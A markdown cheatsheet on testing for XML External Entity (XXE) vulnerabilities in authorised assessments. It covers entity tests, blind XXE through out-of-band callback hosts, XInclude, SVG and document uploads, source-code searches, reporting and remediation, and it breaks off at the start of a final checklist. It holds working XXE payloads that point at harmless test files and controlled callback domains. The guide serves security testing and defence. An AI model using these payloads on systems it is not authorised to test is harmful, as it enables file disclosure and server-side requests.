---
title: XML External Entity (XXE) Cheatsheet
description: Detailed practical XXE cheatsheet for authorised web application security testing covering XML parsers, external entities, file disclosure, blind XXE, out-of-band testing, SSRF interaction, XInclude, SVG and document processing, Burp Suite, source review, evidence, remediation and retesting.
---

# XML External Entity (XXE) Cheatsheet

XML External Entity (XXE) vulnerabilities occur when an application processes attacker-controlled XML using a parser configured to resolve external entities or otherwise access external resources.

A simplified model is:

```text
Attacker-Controlled XML
          |
          v
      XML Parser
          |
          v
External Entity Processing
          |
          +----> Local File
          |
          +----> Network Resource
          |
          +----> External DTD
```

The central question is not simply:

```text
Does the application accept XML?
```

It is:

```text
Which XML parser processes the input?

Are DTDs supported?

Are external entities resolved?

Can the parser access local or remote resources?

Is the resulting data returned or observable?
```

!!! warning "Authorised Security Testing"

    Perform XXE testing only against systems explicitly included in the assessment scope. Local file access, internal network requests, external DTD retrieval and out-of-band callbacks can access resources beyond the immediate application. Use harmless controlled resources wherever possible and avoid retrieving sensitive files unless explicitly authorised.


# Quick Reference

## Minimal XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <value>test</value>
</root>
```


## Internal Entity Test

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY test "XXE_TEST_7f3a9">
]>
<root>&test;</root>
```


## Controlled External Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY test SYSTEM "https://xxe-test.example/xxe-7f3a9">
]>
<root>&test;</root>
```


## Local Lab File Test

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY test SYSTEM "file:///tmp/xxe-test.txt">
]>
<root>&test;</root>
```


## XInclude

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///tmp/xxe-test.txt" parse="text"/>
</root>
```


## Common XML Content Types

```text
application/xml

text/xml

application/soap+xml

image/svg+xml
```


# XXE Testing Model

Do not use:

```text
XML Accepted
    |
    v
   XXE
```

Use:

```text
XML Input
   |
   v
Parser Identified
   |
   v
DTD Supported?
   |
   v
Entity Processing?
   |
   v
External Resource Access?
   |
   v
Observable Result?
   |
   v
Security Impact
```


# XML Basics

A normal XML document may look like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>alice</name>
    <role>user</role>
</user>
```


# Document Type Definition

A DTD can define the structure and entities used by an XML document.

Example:

```xml
<!DOCTYPE user [
    <!ENTITY company "Example Corporation">
]>
```

The entity can then be referenced:

```xml
<name>&company;</name>
```


# Internal Entity

Example:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY marker "XXE_TEST_7f3a9">
]>
<root>&marker;</root>
```

If processed normally, the parser may produce:

```xml
<root>XXE_TEST_7f3a9</root>
```

This demonstrates entity processing.

It does not by itself demonstrate external entity access.


# External Entity

An external entity references a resource outside the XML document.

Example:

```xml
<!ENTITY test SYSTEM "https://xxe-test.example/resource">
```

Conceptually:

```text
XML
 |
 v
Parser
 |
 v
External Entity
 |
 v
Remote Resource
```


# External File Entity

A parser that allows external entities may support a local file URI:

```xml
<!ENTITY test SYSTEM "file:///tmp/xxe-test.txt">
```

Whether this works depends on:

```text
Parser

Configuration

Runtime

Operating system

File permissions

URI handler
```


# Do Not Start With Sensitive Files

Prefer a harmless known file created for the assessment.

For example:

```text
/tmp/xxe-test.txt
```

containing:

```text
XXE_TEST_7f3a9
```

This demonstrates local file access without unnecessarily accessing operating-system secrets.


# Basic XXE Workflow

```text
Find XML Input
      |
      v
Send Valid Baseline
      |
      v
Test Internal Entity
      |
      v
Test Controlled External Entity
      |
      v
Observe Response / Callback
      |
      v
Determine Parser Capabilities
      |
      v
Minimal Impact Validation
```


# Step 1 - Identify XML Input

Look for requests such as:

```http
POST /api/import HTTP/1.1
Host: target.example
Content-Type: application/xml

<user>
    <name>alice</name>
</user>
```


# Step 2 - Establish Baseline

Send a valid request first.

```xml
<?xml version="1.0"?>
<user>
    <name>XXE_TEST_7f3a9</name>
</user>
```

Record:

```text
Status code

Response body

Response length

Response time

Parser errors

Application behaviour
```


# Step 3 - Test Internal Entity Processing

Use:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY marker "XXE_TEST_7f3a9">
]>
<user>
    <name>&marker;</name>
</user>
```

If the application returns:

```text
XXE_TEST_7f3a9
```

in place of the entity, entity expansion is supported.


# Internal Entity Interpretation

This supports:

```text
DTD/entity processing
```

but does not yet prove:

```text
External file access

External HTTP access

SSRF

Sensitive data disclosure
```


# Step 4 - Controlled External Entity

Where outbound interaction testing is authorised:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY ext SYSTEM "https://xxe-test.example/xxe-7f3a9">
]>
<user>
    <name>&ext;</name>
</user>
```


# External Interaction Model

```text
Tester
  |
  v
Application
  |
  v
XML Parser
  |
  v
xxe-test.example
```


# What to Observe

On the controlled server or OOB service:

```text
DNS lookup

HTTP request

Timestamp

Unique path

Source address

User-Agent where present
```


# DNS vs HTTP

A DNS interaction means:

```text
The supplied hostname was resolved.
```

An HTTP interaction provides stronger evidence that:

```text
The parser attempted to retrieve the external resource over HTTP.
```


# Do Not Treat DNS as File Disclosure

A DNS callback demonstrates external interaction.

It does not demonstrate that the parser can read local files.


# Basic File Disclosure

In an authorised lab or against a known harmless test file:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///tmp/xxe-test.txt">
]>
<root>&xxe;</root>
```


# Representative Result

If `/tmp/xxe-test.txt` contains:

```text
XXE_TEST_7f3a9
```

and the response becomes:

```xml
<root>XXE_TEST_7f3a9</root>
```

this supports local file disclosure through external entity resolution.


# Windows Lab File

A controlled Windows test file might be:

```text
C:\Temp\xxe-test.txt
```

A corresponding file URI is typically represented as:

```text
file:///C:/Temp/xxe-test.txt
```

Actual parser behaviour can vary.


# File Permissions Still Apply

XXE does not automatically bypass operating-system permissions.

The parser runs with the permissions of the application process.

Conceptually:

```text
XXE
 |
 v
Application Process
 |
 v
OS File Permissions
 |
 v
Readable?
```


# Parser Errors

XXE testing frequently produces parser errors.

Examples:

```text
DOCTYPE is disallowed

Entity not defined

External entity resolution disabled

Content is not allowed in prolog

Malformed XML

DTD processing prohibited
```


# `DOCTYPE` Blocked

If the parser returns:

```text
DOCTYPE is disallowed
```

this is strong evidence that DTD processing is intentionally disabled for that parser path.


# Entity Not Defined

Example:

```text
The entity "xxe" was referenced, but not declared.
```

This may indicate:

```text
DTD ignored

DTD stripped

Entity declaration rejected

Malformed declaration
```


# External Resolution Disabled

The parser may allow internal entities but reject external entities.

Model:

```text
Internal Entity
     |
     +--> Allowed

External Entity
     |
     X--> Blocked
```


# XXE Types

Useful categories include:

```text
Classic XXE

Blind XXE

Out-of-Band XXE

Error-Based XXE

XInclude Injection

XXE through file processing
```


# Classic XXE

Classic XXE returns the external entity content directly in the application response.

```text
External Resource
      |
      v
XML Parser
      |
      v
Application Response
```


# Blind XXE

Blind XXE occurs when external entity processing takes place but retrieved data is not directly returned.

```text
XML
 |
 v
Parser
 |
 v
External Interaction
 |
 v
No Content Returned
```


# Blind XXE Example

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "https://UNIQUE-ID.oastify.com/xxe-test">
]>
<root>&xxe;</root>
```


# Blind XXE Evidence

A strong minimal proof can be:

```text
1. Submit XML containing unique external entity URL.

2. Application processes the request.

3. OOB service receives DNS lookup.

4. OOB service receives HTTP request.

5. Unique token matches the submitted request.

6. Test is repeated with a second unique token.
```


# Burp Collaborator

Burp Collaborator is useful for blind XXE.

Conceptually:

```text
<!ENTITY xxe SYSTEM "https://UNIQUE-ID.oastify.com/">
```


# Burp Collaborator Workflow

```text
Generate Collaborator Payload
        |
        v
Create External Entity
        |
        v
Send XML Request
        |
        v
Poll Collaborator
        |
        v
DNS?
        |
        +--> Yes -> Resolution occurred
        |
        v
HTTP?
        |
        +--> Yes -> External retrieval attempted
```


# Interactsh

ProjectDiscovery Interactsh can also be used for approved OOB validation.

Use a unique generated hostname for each test case.


# External DTD

An XML document may reference an external DTD.

Example:

```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://xxe-test.example/test.dtd">
<root>test</root>
```


# External DTD Retrieval

If the controlled server records:

```http
GET /test.dtd HTTP/1.1
```

the parser attempted to retrieve the external DTD.


# Why External DTDs Matter

External DTD support can provide additional entity-processing capabilities.

It also demonstrates that XML parsing can cause server-side network interactions.


# Parameter Entities

DTD syntax supports parameter entities.

Example syntax:

```xml
<!ENTITY % test "value">
```

and:

```xml
%test;
```

Parameter entities are primarily used within DTDs.


# Parameter Entity Example

```xml
<!DOCTYPE root [
    <!ENTITY % marker "<!ENTITY test 'XXE_TEST_7f3a9'>">
    %marker;
]>
<root>&test;</root>
```

This is useful for understanding parser behaviour in a controlled environment.


# Out-of-Band XXE

An external DTD can be useful when direct response reflection is unavailable.

Conceptually:

```text
Target XML
    |
    v
External DTD
    |
    v
Parser Processes DTD
    |
    v
Controlled Callback
```


# OOB Testing Principle

The goal of initial OOB testing should be:

```text
Prove external entity retrieval
```

rather than immediately attempting to extract sensitive data.


# Error-Based XXE

Some parsers include external entity content inside error messages.

Conceptually:

```text
External Resource
      |
      v
Parser Error
      |
      v
Application Error Response
```


# Error-Based Validation

Use only harmless test data.

Do not deliberately force sensitive local data into verbose error messages unless that level of testing is explicitly authorised.


# XXE and SSRF

XXE can sometimes cause the parser to make server-side network requests.

Example:

```xml
<!ENTITY xxe SYSTEM "https://xxe-test.example/">
```

This behaviour resembles SSRF.

However, the root cause is XML external entity processing.


# Classification

Use:

```text
XXE
```

when the vulnerable component is:

```text
XML external entity resolution
```

even when the security consequence includes server-side network requests.


# SSRF Relationship

```text
Attacker XML
     |
     v
XML Parser
     |
     v
External Entity
     |
     v
HTTP Request
```

The final HTTP request is an SSRF-like effect of the XXE vulnerability.


# Internal Network Requests

Where explicitly authorised, a controlled internal service can help determine whether the parser can reach internal network resources.

Prefer:

```text
Known test service
```

over:

```text
Broad internal scanning
```


# Do Not Use XXE for Broad Port Scanning

Large-scale internal host or port testing can create unnecessary traffic and risk.

Use the minimum internal validation required by the engagement.


# XInclude

Some applications accept XML data but do not allow control over the document's `DOCTYPE`.

XInclude may represent a separate XML processing surface.


# XInclude Example

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///tmp/xxe-test.txt" parse="text"/>
</root>
```


# XInclude Model

```text
XML Element
    |
    v
XInclude Processor
    |
    v
External Resource
```


# XInclude Is Not Identical to DTD XXE

The underlying XML processing feature differs.

Report the actual mechanism observed.


# XInclude Applicability

XInclude testing is relevant only when:

```text
The parser or downstream XML processor supports XInclude

User-controlled XML elements reach that processor
```


# XML Content-Type Conversion

Some endpoints primarily expect:

```text
application/json
```

but may also accept:

```text
application/xml
```

Test content-type alternatives only when reasonable and within scope.


# JSON Baseline

```http
POST /api/user HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "name": "alice"
}
```


# XML Alternative

```http
POST /api/user HTTP/1.1
Host: target.example
Content-Type: application/xml

<user>
    <name>alice</name>
</user>
```


# Interpretation

If the XML request succeeds, this establishes an XML parsing surface.

It does not establish XXE.


# SOAP

SOAP applications commonly use XML.

Example:

```http
POST /service HTTP/1.1
Host: target.example
Content-Type: text/xml

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetUser>
            <id>1</id>
        </GetUser>
    </soap:Body>
</soap:Envelope>
```


# SOAP XXE Review

Identify:

```text
SOAP parser

DTD configuration

External entity configuration

Schema validation

Framework defaults
```


# SOAPAction

SOAP requests may contain:

```http
SOAPAction:
```

This header is separate from XXE processing.

Do not confuse SOAP action manipulation with XML parser vulnerabilities.


# SVG

SVG is XML-based.

Example:

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     width="100"
     height="100">
    <circle cx="50" cy="50" r="40"/>
</svg>
```


# SVG Upload Processing

Potential flow:

```text
SVG Upload
   |
   v
Image Processor
   |
   v
XML Parser
   |
   v
External Resource Processing?
```


# SVG Testing Questions

Ask:

```text
Is SVG accepted?

Is it parsed server-side?

Is it merely stored?

Is it converted to another format?

Is it rendered directly in the browser?

Does server-side processing resolve external resources?
```


# SVG Can Have Multiple Security Surfaces

An SVG file may involve:

```text
Server-side XML processing

Client-side active content

File upload handling

Content-Type handling
```

Keep these issues distinct.


# Office Documents

Modern Office formats such as:

```text
DOCX

XLSX

PPTX
```

are ZIP archives containing XML files.


# Document Processing

An application that:

```text
Uploads document
       |
       v
Extracts archive
       |
       v
Parses XML
```

may expose XML parsing surfaces.


# Do Not Assume Office Upload Means XXE

The application must actually parse attacker-controlled XML using vulnerable settings.


# ZIP-Based Formats

Other formats can also contain XML.

Always understand the server-side processing chain.


# SAML

SAML messages are XML.

Example components include:

```text
SAMLRequest

SAMLResponse

Assertions

Metadata
```

XML parser security remains relevant, but SAML has additional signature and trust requirements that must be analysed separately.


# SAML Metadata Import

Functionality that imports metadata from XML may provide a useful XML parser review surface.


# XML Configuration Uploads

Applications may accept:

```text
Configuration files

Workflow definitions

Integration definitions

Project files

Data imports
```

in XML format.


# XML-RPC

XML-RPC also uses XML request bodies.

Example:

```xml
<?xml version="1.0"?>
<methodCall>
    <methodName>example.test</methodName>
    <params>
        <param>
            <value>test</value>
        </param>
    </params>
</methodCall>
```


# Parser Fingerprinting

Error messages can sometimes reveal parser technology.

Examples may reference:

```text
libxml

SAX

DOM

DocumentBuilder

XMLReader

XmlReader

Xerces
```

Treat parser fingerprinting as supporting evidence, not proof of insecure configuration.


# Java XML Parsers

Common Java XML APIs include:

```text
DocumentBuilderFactory

SAXParserFactory

XMLInputFactory

TransformerFactory

SchemaFactory
```


# Java Source Search

```bash
rg -ni 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory' -g '*.java' .
```


# Java Candidate

```java
DocumentBuilderFactory factory =
    DocumentBuilderFactory.newInstance();

DocumentBuilder builder =
    factory.newDocumentBuilder();

Document document =
    builder.parse(inputStream);
```

This should be reviewed for secure parser configuration.


# Java Review Questions

Look for settings related to:

```text
DOCTYPE processing

External general entities

External parameter entities

External DTD loading

XInclude

Entity expansion
```


# Java Secure Configuration

Exact secure settings depend on:

```text
Parser implementation

Java version

Framework

Application requirements
```

Follow current vendor and OWASP guidance rather than copying a single parser configuration across every Java XML API.


# .NET XML APIs

Common .NET APIs include:

```text
XmlReader

XmlDocument

XDocument

XmlTextReader

XmlSerializer
```


# .NET Source Search

```bash
rg -ni 'XmlReader|XmlDocument|XDocument|XmlTextReader|XmlSerializer' -g '*.cs' .
```


# .NET Review

Review:

```text
DtdProcessing

XmlResolver

Reader settings

Framework version
```


# Python XML APIs

Python applications may use:

```text
xml.etree.ElementTree

xml.dom.minidom

xml.sax

lxml
```

Security behaviour depends on library and configuration.


# Python Source Search

```bash
rg -ni 'ElementTree|xml\.dom|minidom|xml\.sax|lxml|etree' -g '*.py' .
```


# Python defusedxml

Python applications processing untrusted XML may use:

```text
defusedxml
```

which provides hardened alternatives for several XML processing APIs.


# Search for defusedxml

```bash
rg -ni 'defusedxml' -g '*.py' .
```


# PHP XML APIs

Potential XML functionality includes:

```text
DOMDocument

SimpleXML

XMLReader

libxml
```


# PHP Source Search

```bash
rg -ni 'DOMDocument|simplexml|XMLReader|libxml' -g '*.php' .
```


# libxml

Parser behaviour depends on:

```text
libxml version

PHP version

Parser flags

Application configuration
```


# Ruby XML Libraries

Potential libraries include:

```text
REXML

Nokogiri
```


# Ruby Source Search

```bash
rg -ni 'REXML|Nokogiri' -g '*.rb' .
```


# Node.js XML Libraries

Node.js applications may use third-party XML parsing packages.

Search dependencies and parser construction rather than assuming one standard XML parser.


# Node.js Source Search

```bash
rg -ni 'xml2js|fast-xml-parser|libxml|xmldom|sax' -g '*.js' -g '*.ts' -g 'package.json' .
```


# Go XML

Go applications commonly use:

```text
encoding/xml
```

Search:

```bash
rg -ni 'encoding/xml|xml\.NewDecoder|xml\.Unmarshal' -g '*.go' .
```


# Go Interpretation

Do not classify the presence of:

```text
encoding/xml
```

as XXE.

Review the actual parser behaviour and application data flow.


# Source-to-Sink Model

```text
HTTP Request
     |
     v
XML Body
     |
     v
Application Handler
     |
     v
XML Parser
     |
     v
DTD / Entity Settings
     |
     +--> External Access Disabled
     |
     +--> External Access Enabled
```


# Source Review Workflow

```text
Find XML Input
      |
      v
Find Parser
      |
      v
Identify Configuration
      |
      v
Check DTD Handling
      |
      v
Check Entity Resolution
      |
      v
Check External Resource Access
      |
      v
Check Output Usage
```


# Search XML Endpoints

```bash
rg -ni 'application/xml|text/xml|application/soap\+xml|image/svg\+xml' .
```


# Search DTD References

```bash
rg -ni 'DOCTYPE|DTD|external entity|entity resolver|XmlResolver|DtdProcessing' .
```


# Search XML File Processing

```bash
rg -ni '\.xml|\.svg|\.docx|\.xlsx|\.pptx' src/ config/
```


# Search Parser Construction

```bash
rg -ni 'parse\(|parseString|loadXML|readXML|newDocumentBuilder|XmlReader|DOMDocument' src/
```


# Candidate Classification

## Low Priority

```text
Constant trusted XML
       |
       v
Parser
```

No attacker-controlled XML.


# Medium Priority

```text
User Data
   |
   v
XML Builder
   |
   v
Safe Serializer
```

Review how XML is generated and parsed.


# High Priority

```text
Raw User XML
      |
      v
XML Parser
```

especially when parser hardening cannot be identified.


# High-Priority Pattern

```text
Upload
  |
  v
XML / SVG / Document
  |
  v
Server-Side Parser
```

This deserves focused review.


# Parser Configuration Matters

Two applications using the same XML library may have different risk:

```text
Application A
     |
     v
External Entities Disabled
```

versus:

```text
Application B
     |
     v
External Entities Enabled
```


# Library Presence Is Not a Finding

Do not report:

```text
Application uses XML parser.
```

Report:

```text
Untrusted XML is processed with external entity resolution enabled.
```

when supported by evidence.


# Entity Expansion

XML entities can also create resource-consumption concerns.

This is related to XML parser security but is distinct from external entity file/network access.


# Resource Exhaustion

Avoid high-expansion XML payloads during normal assessments because they can consume significant:

```text
CPU

Memory

Parser resources
```

and may cause denial of service.


# Safe Parser Testing

Prefer:

```text
Single internal entity

Single external callback

Small controlled file
```

over resource-intensive parser stress tests.


# XSLT

Some XML processing pipelines apply XSL transformations.

Flow:

```text
XML
 |
 v
XSLT Processor
 |
 v
Output
```

XSLT processing introduces additional capabilities and should be reviewed separately.


# XML Schema

XML Schema validation does not automatically prevent XXE.

The relevant question remains:

```text
How is external resource resolution configured?
```


# External Schema References

Some XML processing systems can retrieve remote schemas.

This creates another server-side external resource retrieval surface.


# Namespace URLs

An XML namespace declaration such as:

```xml
xmlns:x="https://example.org/schema"
```

does not necessarily cause the parser to retrieve that URL.

Do not assume every namespace URI creates an outbound request.


# Schema Location

Attributes related to schema location can have different processing behaviour depending on the parser and validation configuration.

Test only when relevant to the application's XML pipeline.


# XML Comments

```xml
<!-- test -->
```

have no special XXE significance by themselves.


# CDATA

CDATA:

```xml
<![CDATA[
    <test>
]]>
```

prevents contained text from being interpreted as normal markup.

It is not an XXE defence for the XML document as a whole.


# Encoding

XML may declare encodings:

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Parser behaviour should be tested with normal valid documents first.


# Content-Type vs Body

A request may contain:

```http
Content-Type: application/xml
```

while the body is not valid XML.

Always establish a valid baseline before interpreting parser errors.


# Burp Suite Workflow

```text
Proxy
  |
  v
Find XML Request
  |
  v
Send to Repeater
  |
  v
Baseline XML
  |
  v
Internal Entity
  |
  v
Controlled External Entity
  |
  v
Collaborator
  |
  v
Interpret Result
```


# Burp Repeater

Baseline:

```http
POST /api/import HTTP/1.1
Host: target.example
Content-Type: application/xml

<?xml version="1.0"?>
<user>
    <name>alice</name>
</user>
```


# Internal Entity Test

```http
POST /api/import HTTP/1.1
Host: target.example
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY marker "XXE_TEST_7f3a9">
]>
<user>
    <name>&marker;</name>
</user>
```


# External Entity Test

```http
POST /api/import HTTP/1.1
Host: target.example
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "https://UNIQUE-ID.oastify.com/xxe-7f3a9">
]>
<user>
    <name>&xxe;</name>
</user>
```


# Burp Comparer

Comparer can help identify subtle differences between:

```text
Baseline response

Internal entity response

External entity response
```


# Burp Decoder

Decoder can help inspect encoded XML values when XML is embedded inside:

```text
Base64

URL parameters

JSON strings
```


# XML Embedded in JSON

Example:

```json
{
  "document": "<user><name>alice</name></user>"
}
```

The XML parser may be downstream from the JSON handler.


# Base64-Encoded XML

Example flow:

```text
Base64 Input
    |
    v
Decode
    |
    v
XML Parser
```

Do not assume encoded data is safe simply because XML is not directly visible in the HTTP request.


# Multipart XML Upload

Example:

```http
POST /upload HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----test
```

The uploaded file may later be parsed as XML.


# File Upload Workflow

```text
Upload File
    |
    v
File Stored
    |
    v
Background Processor
    |
    v
XML Parser
```

This can create delayed or blind XXE.


# Asynchronous Processing

Allow sufficient time for callbacks when XML is processed by:

```text
Queues

Workers

Import jobs

Document processors

Scheduled tasks
```


# Stored XML

An application may store XML and process it only later.

Example:

```text
Upload
  |
  v
Database / Object Storage
  |
  v
Import Job
  |
  v
Parser
```


# Blind Processing

The initial upload may return:

```http
HTTP/1.1 202 Accepted
```

while XXE processing occurs later.


# OOB Correlation

Use unique identifiers:

```text
xxe-7f3a9

xxe-91bc2
```

for separate requests.


# Repeatability

A good validation uses:

```text
Test A -> callback A

Test B -> callback B
```

This reduces ambiguity.


# Callback Source

The observed callback may originate from:

```text
Web server

Worker

Proxy

NAT gateway

Document conversion service
```

Do not assume the source IP is the frontend server.


# User-Agent

An OOB HTTP request may contain a User-Agent that hints at the underlying library.

Treat it as supporting evidence only.


# Response Differences

If external entity retrieval is blocked, responses may differ.

Example:

```text
Baseline:
200 OK

Internal entity:
200 OK

External entity:
500 Internal Server Error
```

This may indicate external entity processing was attempted and failed.

Further validation is required.


# Timeouts

An external entity pointing to an unreachable destination may cause a delay.

However:

```text
Timeout != confirmed XXE
```

because many application behaviours can produce timing differences.


# False Positive - XML Accepted

```text
application/xml accepted
```

does not prove XXE.


# False Positive - Internal Entity

Internal entity expansion alone does not prove external resource access.


# False Positive - Scanner Alert

A scanner reporting:

```text
Possible XXE
```

is a candidate requiring validation.


# False Positive - DNS Interaction

Determine whether the interaction was triggered by:

```text
XML parser

Security scanner

URL validator

Other application component
```

Use unique tokens and repeatability.


# False Positive - Reflected XML

If the server merely reflects the XML body without parsing it, entity syntax may appear in the response unchanged.


# Example Unparsed Response

Input:

```xml
<root>&xxe;</root>
```

Response:

```text
You submitted: <root>&xxe;</root>
```

This does not demonstrate entity expansion.


# False Positive - Client-Side Parsing

If JavaScript in the browser parses the XML, the issue is not server-side XXE in the tested application backend.

Determine where parsing occurs.


# False Positive - Namespace URL

A namespace URI appearing in XML does not prove the parser retrieves it.


# Common Testing Mistake - `/etc/passwd` First

Do not start by accessing sensitive system files.

Use:

```text
Controlled callback

Harmless test file
```

first.


# Common Testing Mistake - Ignoring Blind XXE

A parser may resolve external entities even when nothing appears in the response.


# Common Testing Mistake - Ignoring File Uploads

XML parsing often occurs in:

```text
SVG

Office documents

Configuration imports

Metadata files
```

rather than obvious XML API endpoints.


# Common Testing Mistake - Ignoring Background Jobs

The parser may run asynchronously.


# Common Testing Mistake - Confusing XXE and SSRF

If XML entity processing causes the request, identify XXE as the root cause.


# Common Testing Mistake - Assuming All Parsers Behave the Same

Parser security depends heavily on:

```text
Library

Version

Configuration

Framework defaults
```


# Common Testing Mistake - Using DoS Payloads

Entity expansion attacks can destabilise the target.

Avoid resource-exhaustion testing unless specifically authorised.


# Common Testing Mistake - Testing Only `DOCTYPE`

If the application constructs XML internally, other XML processing features such as XInclude may still matter.


# Common Testing Mistake - Overclaiming

Do not claim:

```text
XXE gives full server compromise.
```

when you demonstrated only:

```text
External DNS resolution.
```


# Impact Questions

Ask:

```text
Can external entities be resolved?

Can local files be read?

Which files are readable by the application account?

Can external HTTP requests be made?

Can internal resources be reached?

Is the response returned?

Is the issue blind?

Can external DTDs be loaded?

Does processing occur with elevated privileges?

Does the parser run in a separate worker?

Are cloud/internal services reachable?
```


# Severity Considerations

Consider:

```text
Authentication required

Parser privileges

Local file access

Response visibility

Internal network access

Cloud environment

External network access

Stored/asynchronous processing

Data sensitivity
```


# Evidence Collection

Record:

```text
Finding ID

Endpoint

HTTP method

Content-Type

Authentication context

XML input location

Parser behaviour

Entity declaration

Controlled marker

OOB hostname

DNS interaction

HTTP interaction

Local test file if used

Returned content

Timestamp

Response

Parser error
```


# Basic XXE Evidence Chain

```text
1. Valid baseline XML accepted.

2. Internal entity processed.

3. Controlled external entity submitted.

4. External callback observed.

5. Test repeated with unique identifier.

6. Local harmless file used if required and authorised.

7. File contents returned.
```


# Blind XXE Evidence Chain

```text
Request
   |
   v
Unique External Entity
   |
   v
Application Response
   |
   v
OOB DNS / HTTP
   |
   v
Timestamp Correlation
   |
   v
Repeat
```


# Evidence for File Disclosure

Capture:

```text
Controlled test file creation

Known file contents

XML payload

Application response

Exact returned marker
```


# Reporting Example - External Entity Resolution

> The XML import endpoint processes user-controlled XML with external entity resolution enabled. An XML document containing an external entity referencing assessment-controlled infrastructure caused the application environment to perform a correlated HTTP request to the supplied destination. This demonstrates that untrusted XML can trigger server-side external resource retrieval.


# Reporting Example - File Disclosure

> The XML parser used by the import functionality resolves external file entities. During controlled testing, an entity referencing a harmless assessment-created file on the application host was expanded and the known file contents were returned in the application response. This demonstrates that files readable by the application process can be disclosed through XML entity resolution.


# Reporting Example - Blind XXE

> The application processes external entities but does not return the retrieved resource in the HTTP response. A unique external entity referencing assessment-controlled infrastructure resulted in correlated DNS and HTTP interactions from the application environment. The behaviour was reproduced with a second unique identifier, confirming blind XXE.


# Reporting Example - DNS Only

> A unique external entity hostname resulted in a correlated DNS lookup from the application environment. No HTTP request or local file disclosure was observed during repeated testing. The result demonstrates external hostname resolution during XML processing but does not establish successful HTTP resource retrieval or file disclosure.


# Reporting Example - XInclude

> The application processes user-controlled XInclude elements. A controlled XInclude reference to an assessment-created local test file caused the known file contents to be included in the processed document. The issue results from unsafe XInclude processing rather than DTD-based external entity resolution.


# Reporting Example - Secure Parser

If testing shows:

```text
DOCTYPE rejected

No OOB interaction

No XInclude processing
```

do not report XXE.

Record the secure behaviour in assessment notes if useful.


# Remediation Principle

The preferred approach is:

```text
Do not process DTDs or external entities when they are not required.
```


# Disable DTD Processing

Where application functionality does not require DTDs:

```text
Disable DTD processing.
```


# Disable External Entities

Disable:

```text
External general entities

External parameter entities

External DTD retrieval
```

where supported by the parser.


# Disable External Resolution

Ensure the XML parser cannot automatically retrieve:

```text
Local files

HTTP resources

Other external resources
```


# Disable XInclude

If XInclude is unnecessary:

```text
Disable XInclude processing.
```


# Use Hardened Parser APIs

Use parser configurations recommended by:

```text
Language vendor

Framework vendor

OWASP
```

for the exact library and runtime version.


# Avoid Generic Copy-Paste Parser Fixes

A secure configuration for:

```text
Java DocumentBuilderFactory
```

does not automatically apply to:

```text
SAXParserFactory

XMLInputFactory

TransformerFactory
```

Configure each XML processing API appropriately.


# Least Privilege

The application process should have access only to files and network destinations required for its function.


# File Permissions

Even with parser hardening:

```text
Application account
      |
      v
Minimal filesystem access
```

reduces the impact of parser mistakes.


# Network Segmentation

Prevent XML-processing workloads from reaching unnecessary:

```text
Management networks

Metadata services

Database networks

Administrative interfaces
```


# Egress Filtering

If the parser does not need outbound Internet access:

```text
Block unnecessary outbound access.
```


# Isolate Document Processing

Complex document conversion can be isolated.

```text
Application
    |
    v
Restricted Processing Worker
    |
    X--> Sensitive Internal Networks
```


# Input Validation

Schema validation can help ensure expected document structure.

However:

```text
Schema validation alone != XXE protection
```


# Update Libraries

Keep XML parsers and document-processing libraries supported and patched.


# Avoid Verbose Parser Errors

Detailed parser errors can reveal:

```text
Filesystem paths

Library details

Internal configuration
```

Return generic errors to untrusted clients while retaining useful server-side logging.


# Retesting

Retest the exact original XML processing path.


# Retest Baseline

Confirm valid legitimate XML still works:

```xml
<?xml version="1.0"?>
<root>
    <value>normal</value>
</root>
```


# Retest Internal Entity

Depending on the intended parser configuration, entity processing should be handled according to the security design.


# Retest External Entity

Submit a controlled external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "https://UNIQUE-ID.oastify.com/retest">
]>
<root>&xxe;</root>
```

Expected secure result:

```text
DOCTYPE rejected
```

or:

```text
External entity not resolved
```

with no OOB interaction.


# Retest Collaborator

Poll the controlled OOB service.

Expected:

```text
No DNS interaction

No HTTP interaction
```


# Retest Local File

Where authorised and appropriate, confirm the harmless test file can no longer be retrieved.


# Retest XInclude

If the original issue involved XInclude, test the original XInclude path separately.


# Retest File Upload

If the vulnerability occurred through:

```text
SVG

Office document

XML import
```

retest the exact file-processing workflow.


# Retest Background Processing

Allow the normal worker/job cycle to complete before concluding remediation is effective.


# Retest All XML Parsers

An application can contain multiple XML-processing paths:

```text
API parser

Import parser

Document parser

SOAP parser

SAML parser
```

Fixing one does not automatically fix the others.


# Root Cause Search

After one XXE issue is found, search the codebase for other parser construction sites.

Java:

```bash
rg -ni 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory' -g '*.java' .
```

.NET:

```bash
rg -ni 'XmlReader|XmlDocument|XDocument|XmlTextReader' -g '*.cs' .
```

Python:

```bash
rg -ni 'ElementTree|xml\.dom|xml\.sax|lxml|etree' -g '*.py' .
```

PHP:

```bash
rg -ni 'DOMDocument|simplexml|XMLReader|libxml' -g '*.php' .
```


# Practical XXE Checklist

## Discovery

